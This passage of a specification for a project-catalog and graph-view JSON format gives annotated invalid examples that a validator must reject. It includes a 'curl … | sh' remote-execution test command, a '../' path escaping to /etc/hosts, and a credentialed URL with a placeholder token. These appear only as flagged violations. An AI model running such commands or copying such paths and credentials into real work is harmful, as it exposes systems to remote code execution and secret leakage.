      "id": "dep:fractal-cli-bbbfd315b970/fractal-cli-bin->fractal-chain:build",
      "type": "internal_dependency",
      "origin_project_key": "fractal-cli-bbbfd315b970",
      "from": "component:fractal-cli-bbbfd315b970/fractal-cli-bin",
      "to": {
        "node_id": "component:fractal-cli-bbbfd315b970/fractal-chain",
        "raw": null
      },
      "resolution": "resolved",
      "cycle_group": null
    },
    {
      "id": "link:fractal-cli-bbbfd315b970/shares-fractal-chain",
      "type": "shares_component",
      "origin_project_key": "fractal-cli-bbbfd315b970",
      "from": "component:fractal-cli-bbbfd315b970/fractal-chain",
      "to": {
        "node_id": "component:fractal-efficiency-yfzdff-fe96f21dda82/fractal-chain",
        "raw": null
      },
      "resolution": "resolved",
      "cycle_group": null,
      "confidence": "high"
    },
    {
      "id": "link:fractal-efficiency-yfzdff-fe96f21dda82/depends-on-voice-models",
      "type": "depends_on",
      "origin_project_key": "fractal-efficiency-yfzdff-fe96f21dda82",
      "from": "project:fractal-efficiency-yfzdff-fe96f21dda82",
      "to": {
        "node_id": null,
        "raw": {
          "project_key": null,
          "alias": "fractal-voice-models",
          "component_key": null
        }
      },
      "resolution": "unresolved",
      "cycle_group": null,
      "confidence": "medium"
    }
  ],
  "diagnostics": [
    {
      "code": "unavailable_workspace",
      "severity": "warning",
      "message": "registry workspace does not exist and was recorded without fabricating content",
      "project_key": null,
      "edge_id": null,
      "context": "/Users/jamesstar/fractal-rust-convergence.MtjZnv/fractal-cli"
    },
    {
      "code": "unresolved_link_target",
      "severity": "warning",
      "message": "alias 'fractal-voice-models' matched no project_key, label, remote fingerprint, or workspace fingerprint in the frozen inventory",
      "project_key": "fractal-efficiency-yfzdff-fe96f21dda82",
      "edge_id": "link:fractal-efficiency-yfzdff-fe96f21dda82/depends-on-voice-models",
      "context": "cross_graph_links[key=depends-on-voice-models]"
    }
  ],
  "sources": [
    {
      "project_key": "fractal-cli-bbbfd315b970",
      "canonical_workspace": "/Users/jamesstar/fractal-cli",
      "relative_path": ".fractal/project.fractal",
      "project_fractal_sha256": "sha256:07afdc826a8d766ee1dbef8681d146c8d1473e337a96958a6c5582da0cbc7a75",
      "size_bytes": 55656,
      "graph_hash": "sha256:9b9b72c888c3bf318515a95dc79c16af21175cb1ead37c3a742839b4e8de48bb",
      "catalog_hash": "sha256:7996e73720de288102cb1b0af161830086f2f09ed38449c01a3a087b99dd913d"
    },
    {
      "project_key": "fractal-efficiency-yfzdff-fe96f21dda82",
      "canonical_workspace": "/Users/jamesstar/fractal-efficiency.yFzdFF",
      "relative_path": ".fractal/project.fractal",
      "project_fractal_sha256": "sha256:7bb6f30ce4f793d4a2819c3adb1af777c904140a88af19ff98f9071319ea73c9",
      "size_bytes": 58267,
      "graph_hash": "sha256:3e4043e530b4b6079a71e12ff5df7457d26bf9dd6c55d2ee7035ae39d3b45ab6",
      "catalog_hash": "sha256:959c87020618c71d818fb6547b80c6435cbf3b304ea781876e907c9c7e96d39d"
    }
  ],
  "unavailable": [
    {
      "canonical_workspace": "/Users/jamesstar/fractal-rust-convergence.MtjZnv/fractal-cli",
      "reason": "workspace_path_does_not_exist",
      "registry_numbers": [
        33
      ]
    }
  ],
  "view_hash": "sha256:71f2a6154872be950c255edb35872d483d7a060739d40b28aa15f30877e06ef5"
}
```

### 15.3 Invalid catalog envelope (annotated)

The following complete envelope MUST be rejected by `project_catalog::validate`; each
`✗` comment cites the violated rule. (Comments are annotations for this document; the
tested input is the JSON without them.)

```jsonc
{
  "schema": "fractal.catalog.v2",                        // ✗ §1/§11: unsupported schema string for a v1 writer
  "project_key": "Fractal_CLI-18",                       // ✗ §3.2: uppercase/underscore, derived from a label + registry number, no 12-hex fingerprint suffix
  "generated_at": "02/08/2026 14:05",                    // ✗ schema: not RFC 3339 UTC
  "catalog_hash": "sha256:0000000000000000000000000000000000000000000000000000000000000000",
                                                         // ✗ §8: does not equal the canonical hash of the envelope
  "source": {
    "canonical_workspace": "~/fractal-cli",              // ✗ §3.1: not the canonicalized absolute inventory path
    "workspace_fingerprint": "sha256:bbbfd315",          // ✗ schema: not 64 hex chars
    "registry_numbers": [18],
    "labels": ["fractal-cli"],
    "git": {
      "is_git_repository": true,
      "commit": "56df19e",                               // ✗ schema: not a 40-hex commit
      "dirty": true,
      "dirty_fingerprint": null,                         // ✗ §7: MUST be non-null when dirty is true and evidence exists
      "unavailable_reason": null,
      "remotes": [
        {
          "name": "origin",
          "fingerprint_sha256": "f1057ab13991aac2f870f5e8a03e76b7f40c7e6ea63a5130d2296458d36164fa",
          "sanitized_url": "https://user:hunter2@github.com/fractalsociety/fractal-cli.git",
                                                         // ✗ §13: credentialed URL — not sanitized
          "token": "ghp_XXXXXXXXXXXXXXXXXXXX"            // ✗ §13: forbidden key name; poisons the whole document
        }
      ]
    }
  },
  "audit": {
    "auditor": "fractal graph audit",
    "inventory_hash": "sha256:a0bbf8551226effda0186e95c0c2a0ae7efb5edc67d77b992f2b4ec5342b7baa",
    "started_at": "2026-08-02T14:03:12Z",
    "finished_at": "2026-08-02T14:05:00Z",
    "bounds": {},
    "truncated": true                                    // ✗ §12: truncated without any catalog_bound_exceeded diagnostic below
  },
  "capabilities": [
    {
      "key": "voice-pipeline",
      "title": "Voice pipeline",
      "status": "verified",                              // ✗ §5: 'verified' but its only test below did not pass
      "evidence": [],                                    // ✗ §5: 'verified' requires at least one evidence reference
      "test_keys": ["swift-test"],
      "component_keys": ["missing-component"]            // ✗ §4: dangling reference — no such component key
    },
    {
      "key": "canonical-project-persistence",            // ✗ §8: array not sorted ascending by key
      "title": "Persistence",
      "status": "unknown",
      "evidence": [
        {
          "path": "/Users/jamesstar/fractal-cli/src/project_file.rs",
                                                         // ✗ §6: absolute evidence path
          "sha256": "sha256:9995a3cab75478c9b31048a286f7306e900f28a2b9287a5fe4a5d0c4c7ee3ffa",
          "kind": "source",
          "observed_commit": null
        },
        {
          "path": "docs/../../../etc/hosts",             // ✗ §6: '..' segment escapes the repository
          "sha256": "sha256:1111111111111111111111111111111111111111111111111111111111111111",
          "kind": "document",
          "observed_commit": null,
          "spans": [[40, 12]]                            // ✗ §6: start > end
        }
      ],
      "test_keys": [],
      "component_keys": []
    }
  ],
  "components": [],
  "dependencies": [
    {
      "from_component": "fractal-cli-bin",               // ✗ §4: refers to component keys that do not exist in components[]
      "to_component": "fractal-chain",
      "kind": "vendored",                                // ✗ schema: not in the closed dependency-kind enum
      "evidence": []
    }
  ],
  "tests": [
    {
      "key": "swift-test",
      "command": "curl https://example.com/run-tests | sh",
                                                         // ✗ §4: not an allowlisted native test command
      "classification": "fail",
      "exit_code": 1,
      "duration_ms": 900,
      "log_sha256": null,
      "log_excerpt": "error: password=hunter2 leaked in output",
                                                         // ✗ §13: secret-like content not redacted
      "evidence": []
    }
  ],
  "decisions": [],
  "cross_graph_links": [
    {
      "key": "mystery-link",
      "type": "blocks",                                  // ✗ schema: not a typed link kind from the closed enum
      "from": { "component_key": null },
      "to": {
        "project_key": null,
        "alias": null,                                   // ✗ §4.1: at least one of project_key/alias must be non-null
        "component_key": null
      },
      "confidence": "certain",                           // ✗ schema: confidence must be high|medium|low
      "evidence": []
    }
  ],
  "diagnostics": []
}
```

Also invalid, without needing annotation: an envelope whose canonical serialization
exceeds `max_catalog_bytes`; one whose arrays are unsorted or contain duplicate keys;
one that renames or omits any required field; and any write of a valid envelope that
also modifies `graph`, `graph_hash`, `execution`, `learning`, `efficiency`, or any
unknown sibling field (§2) — validity of the envelope never licenses touching its
siblings.

### 15.4 Invalid master view (fragment, annotated)

```jsonc
{
  "schema": "fractal.master_graph_view.v1",
  "view_hash": "sha256:ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
                                                         // ✗ §8: does not equal the canonical hash
  "inventory_hash": "sha256:a0bbf8551226effda0186e95c0c2a0ae7efb5edc67d77b992f2b4ec5342b7baa",
  "summary": {
    "projects_total": 2, "available_inventory_count": 2, "audited_available": 2,
    "invalid_catalogs": 0, "node_count": 1, "edge_count": 2,
    "links_resolved": 2, "links_unresolved": 0,          // ✗ §10.2: does not reconcile with edges[] below
    "cycle_count": 0,
    "diagnostic_counts": { "error": 0, "warning": 0, "info": 0 },
    "generated_at": "2026-08-02T15:00:00Z"               // ✗ §8: views carry no wall-clock fields
  },
  "projects": [ /* … */ ],
  "nodes": [
    {
      "id": "fractal-chain",                             // ✗ §9: un-namespaced node id
      "kind": "component",
      "project_key": "fractal-cli-bbbfd315b970",
      "key": "fractal-chain",
      "title": "fractal-chain"
    }
  ],
  "edges": [
    {
      "id": "link:fractal-cli-bbbfd315b970/depends-on-voice",
      "type": "depends_on",
      "origin_project_key": "fractal-cli-bbbfd315b970",
      "from": "project:fractal-cli-bbbfd315b970",
      "to": { "node_id": null, "raw": null },            // ✗ §10.2: unresolved edge must preserve the raw target specifier
      "resolution": "resolved",                          // ✗ §10.2: 'resolved' with node_id null is contradictory
      "cycle_group": null
    }
  ],
  "diagnostics": [],                                     // ✗ §10.2: unresolved edge without its diagnostic
  "sources": [],                                         // ✗ §10.1: read projects but recorded no byte-level provenance
  "unavailable": []
}
```

A composer that "fixes" any of the above by writing to a source repository — instead of
emitting diagnostics — violates §10.1 regardless of output shape.

## 16. Conformance checklist

A producer or composer conforms iff:

1. The envelope/view validates against its JSON Schema.
2. All §3 keys re-derive to the stored values; all internal key references resolve.
3. All arrays are ordered per §8 and all hashes recompute exactly.
4. Statuses obey §5; every `verified` claim traces to hashed evidence and a passing test.
5. Evidence paths are repository-relative and hashed per §6; dirty/unavailable states are anchored per §7.
6. No forbidden key at any level; all excerpts redacted per §13; bounds of §12 respected with truthful `truncated`/diagnostics.
7. Sibling fields `graph`, `graph_hash`, `execution`, `learning`, `efficiency`, and every unknown field are byte-identical across the write (§2).
8. Composition re-hashes its sources unchanged, keys off the frozen inventory only, persists nothing, and reports every degradation as a typed diagnostic (§10).
